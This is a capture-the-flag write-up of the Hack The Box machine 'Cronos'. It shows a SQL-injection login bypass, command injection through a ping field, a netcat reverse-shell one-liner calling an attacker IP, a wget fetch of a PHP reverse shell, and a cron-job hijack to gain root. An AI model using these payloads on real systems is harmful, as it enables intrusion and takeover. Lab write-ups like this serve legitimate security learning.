---
title: Cronos Hackthebox Writeup
date: 2021-01-06 01:00:00 +0800
categories: [Hackthebox, Retired]
tags: [linux,sqli,slq injection,php,command execution,cron jobs]     # TAG names should always be lowercase
image: /assets/img/cronos-hackthebox/cronos-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Cronos:~$


Column | Details
------------ | -------------
Name | Cronos
IP | 10.10.10.13
Points | 30
Os | Linux
Difficult | Medium
Creator | [ch4p](https://www.hackthebox.eu/home/users/profile/1)
Out on | 22nd March 2017

# Summary:~$

* Discovering the new host and scanning for open ports.
* Using `gobuster` for **subdomain** enumeration.
* Loging into `admin.cronos.htb` using SQL Payload i.e *' or 1=1 #*
* Getting `Command Execution` and further reverse shell.
* Exploited a `cron job` running with Root permissions to Escalate Privileges.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/cronos-hackthebox/nmap-scan-1.png)

Basically `3 ports` are open i.e. `22,80,53`. Let's access port 80 first.

___
![](/assets/img/cronos-hackthebox/port-80-2.png)

It shows an `Apache2 default page`. In nmap scan we got to know the title is `cronos`, so I entered the IP and *cronos.htb* in my `/etc/hosts` file.

Accessing `cronos.htb`, we get this:

___
![](/assets/img/cronos-hackthebox/cronos-htb-3.png)

I used `dirbuster` to find **hidden directories**. *Wordlist used*: directory-list-2.3-medium.txt.

___
![](/assets/img/cronos-hackthebox/dirbuster-command-4.png)

I got a few directories, but nothing interesting.

___
![](/assets/img/cronos-hackthebox/dirbuster-result-5.png)

When I saw `port 53` as open, the first thing striked in my mind was `Subdomain Enumeration`.
**Gobuster Command**: *gobuster vhost -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u cronos.htb*

___
![](/assets/img/cronos-hackthebox/gobuster-subdomain-enum-cronos-6.png)

We found `admin.cronos.htb`, acessing it gave us a `login page`.

___
![](/assets/img/cronos-hackthebox/login-page-on-admin-page-7.png)

I used a `SQL Payload` to bypass the login page.
**Payload**: *' or 1=1 #*

___
![](/assets/img/cronos-hackthebox/logged-in-admin-page-8.png)

From the dropdown I selected `ping` option and used `|` to add *whoami* command.

___
![](/assets/img/cronos-hackthebox/whoami-command.png)

We got `www-data` as a result, It shows that we have `Command execution` on the machine. Let's get a reverse shell.
**Payload**: *rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f*

[Payload link](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

___
![](/assets/img/cronos-hackthebox/got-www-data-shell-10.png)

We got a reverse shell as `www-data`, and further captured the *user-flag*.

For `Escalating Privileges`, I had transfered [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) to the machine using *wget* command.

___
![](/assets/img/cronos-hackthebox/download-wget-on-the-machine-12.png)

After giving `executing permissions` to linpeas.sh by *chmod +x linpeas.sh*, I ran it and got this:

___
![](/assets/img/cronos-hackthebox/something-phishy-13.png)

There is a `cron job` running which executes *artisan* script with PHP.

Just to make sure I used [pspy32](https://github.com/DominicBreuker/pspy) which detects the cron jobs running in linux.

___
![](/assets/img/cronos-hackthebox/cron-job-running-15.png)

Now let's replace the `artisan` file with our own malicious script.

**PHP Shell**: *https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php*

**wget command**: *wget http://10.10.14.17:8081/shell.php*

Further I renamed the file to *artisan* using `mv` command.

___
![](/assets/img/cronos-hackthebox/got-root-18.png)

Listening on specified port using `nc`, We got `Root`.
